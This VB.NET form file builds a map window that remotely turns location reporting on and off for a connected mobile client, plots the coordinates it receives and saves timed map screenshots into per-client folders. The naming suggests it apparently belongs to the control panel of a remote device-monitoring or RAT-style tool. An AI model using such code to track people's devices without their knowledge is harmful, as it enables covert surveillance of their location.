Imports System.IO
Imports System.Reflection
Imports System.Security.Cryptography
Imports Microsoft.Web.WebView2.Core

Public Class LocationMap
    Public BTcli As BTClient
    Private lastlat As Integer = 0
    Private lastlng As Integer = 0
    Private Async Sub LocationMap_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Await mapview.EnsureCoreWebView2Async()
        mapview.NavigateToString(My.Resources.map)
        Dim startthread As New Threading.Thread(Sub()
                                                    Dim chatData As New Dictionary(Of String, Object) From {
                                                       {"msg", "loc"},
                                                       {"cas", "E"}'Enable
                                                     }
                                                    BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
                                                End Sub)
        startthread.IsBackground = True
        startthread.Start()

        myico.Image = BTcli.wallpaper
        mytitle.Text = loctionstr

    End Sub

    Private Sub LocationMap_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Dim chatData As New Dictionary(Of String, Object) From {
                                                       {"msg", "loc"},
                                                       {"cas", "D"}'Enable
                                                     }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub
    Public Async Sub UpdateMap(lat As Double, lng As Double)
        lastlat = CInt(lat)
        lastlng = CInt(lng)
        Await mapview.ExecuteScriptAsync($"updateMap({lat}, {lng});")
    End Sub
    Public Async Sub Updatetheme(theme As String)
        Await mapview.ExecuteScriptAsync($"changetheme('{theme}');")
    End Sub
    Private Sub comboacctype_SelectedIndexChanged(sender As Object, e As EventArgs) Handles comboacctype.SelectedIndexChanged
        Select Case comboacctype.Text
            Case "Dark"
                Updatetheme("D")
            Case "Light"
                Updatetheme("L")
            Case Else
                Updatetheme("S")
        End Select
    End Sub

    Private Sub savitbtn_Click(sender As Object, e As EventArgs) Handles savitbtn.Click
        If savitbtn.Tag = "n" Then
            savitbtn.Tag = "y"
            savitbtn.ForeColor = Color.Lime
            savitbtn.RectColor = Color.Lime
            savetimer.Start()
        Else
            savitbtn.Tag = "n"
            savitbtn.ForeColor = Color.White
            savitbtn.RectColor = Color.Gray
            savetimer.Stop()
            savetimer.Dispose()
            Dim savefolder As String = BTcli.userfolder & "\Locations"
            If IO.Directory.Exists(savefolder) Then
                Process.Start(savefolder)
            End If
        End If
    End Sub

    Private Async Sub savetimer_Tick(sender As Object, e As EventArgs) Handles savetimer.Tick
        Try
            Dim savefolder As String = BTcli.userfolder & "\Locations"
            If Not IO.Directory.Exists(savefolder) Then
                IO.Directory.CreateDirectory(savefolder)
            End If

            ' Create a memory stream to hold the image
            Using stream As New IO.MemoryStream()
                ' Capture the WebView to the stream as PNG
                Await mapview.CoreWebView2.CapturePreviewAsync(
                        CoreWebView2CapturePreviewImageFormat.Png,
                     stream
                 )

                ' Save the image to a file (optional)
                Dim savePath As String = savefolder & "\" & $"map_lt{lastlat}_lg{lastlng}_{DateAndTime.Now.ToString("yyMMddhhmmssfff")}.png"
                Using fileStream = New IO.FileStream(savePath, IO.FileMode.Create, IO.FileAccess.Write)
                    stream.Position = 0
                    stream.CopyTo(fileStream)
                End Using

                ''MessageBox.Show("Screenshot saved to: " & savePath)
            End Using


        Catch ex As Exception

        End Try
    End Sub
End Class